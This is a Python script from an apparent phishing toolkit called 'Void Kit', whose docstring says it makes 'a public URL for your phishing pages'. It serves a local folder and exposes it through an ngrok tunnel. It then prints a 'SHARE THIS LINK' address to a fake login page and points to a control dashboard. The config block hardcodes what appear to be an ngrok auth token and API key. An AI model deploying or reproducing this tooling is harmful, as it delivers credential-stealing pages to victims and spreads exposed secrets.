#!/usr/bin/env python3
"""
Void Kit - Ngrok Tunnel Server
Run this first to create a public URL for your phishing pages.
"""
import os
import sys
import time
import json
import http.server
import threading
import subprocess
import urllib.request
import socket
import webbrowser

# Config
NGROK_AUTHTOKEN = "2cNXpvv6fQPdscufAaWkx1RsvDT_7WpjYJ3qesQ3xS1t8WDfX"
NGROK_API_KEY = "3EJLz7IPg1JqzoyW6KOWud8gbjd_51bX3TFnac52prdkLYYUb"
PORT = 8080
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
NGROK_PATH = os.path.join(BASE_DIR, "ngrok.exe")
ngrok_proc = None

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def start_http_server():
    """Start HTTP server serving current directory"""
    os.chdir(BASE_DIR)
    
    handler = http.server.SimpleHTTPRequestHandler
    
    class QuietHandler(handler):
        def log_message(self, format, *args):
            pass
    
    server = http.server.HTTPServer(('0.0.0.0', PORT), QuietHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[+] HTTP Server running at:")
    print(f"    http://localhost:{PORT}")
    print(f"    http://{get_local_ip()}:{PORT}")
    return server

def start_ngrok():
    """Start ngrok tunnel"""
    global ngrok_proc
    
    if not os.path.exists(NGROK_PATH):
        print("[!] ngrok.exe not found. Downloading...")
        return None
    
    # Kill existing ngrok
    subprocess.run("taskkill /f /im ngrok.exe 2>nul", shell=True)
    time.sleep(1)
    
    # Configure auth
    subprocess.run([NGROK_PATH, "config", "add-authtoken", NGROK_AUTHTOKEN], 
                   capture_output=True, shell=True)
    
    # Start ngrok
    ngrok_proc = subprocess.Popen(
        [NGROK_PATH, "http", str(PORT)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True
    )
    
    print("[*] Waiting for ngrok to connect...")
    
    # Wait for ngrok URL
    for i in range(30):
        time.sleep(2)
        try:
            req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels")
            with urllib.request.urlopen(req, timeout=2) as resp:
                data = json.loads(resp.read().decode())
                tunnels = data.get("tunnels", [])
                for t in tunnels:
                    url = t.get("public_url", "")
                    if url.startswith("https"):
                        return url
        except:
            pass
    
    return None

def cleanup():
    """Cleanup on exit"""
    global ngrok_proc
    if ngrok_proc:
        ngrok_proc.terminate()
        print("[+] Ngrok stopped")
    print("[+] Server stopped")

if __name__ == "__main__":
    print("=" * 60)
    print("  VOID KIT - NGROK TUNNEL SERVER")
    print("=" * 60)
    print()
    
    # Start HTTP server
    server = start_http_server()
    
    # Start ngrok
    print("[*] Starting ngrok tunnel (this may take a moment)...")
    ngrok_url = start_ngrok()
    
    if ngrok_url:
        print()
        print("=" * 60)
        print("  ✅ NGROK TUNNEL ACTIVE!")
        print(f"  URL: {ngrok_url}")
        print()
        print("  📋 SHARE THIS LINK:")
        print(f"  {ngrok_url}/sites/login.html")
        print()
        print("  📊 Open dashboard.html for the control panel")
        print("=" * 60)
        print()
        
        # Open in browser
        webbrowser.open(f"{ngrok_url}/sites/login.html")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    else:
        print()
        print("[!] Could not get ngrok URL. Make sure you have internet.")
        print("[*] You can still use the local server:")
        print(f"    http://localhost:{PORT}/sites/login.html")
        print(f"    http://{get_local_ip()}:{PORT}/sites/login.html")
    
    server.shutdown()
    cleanup()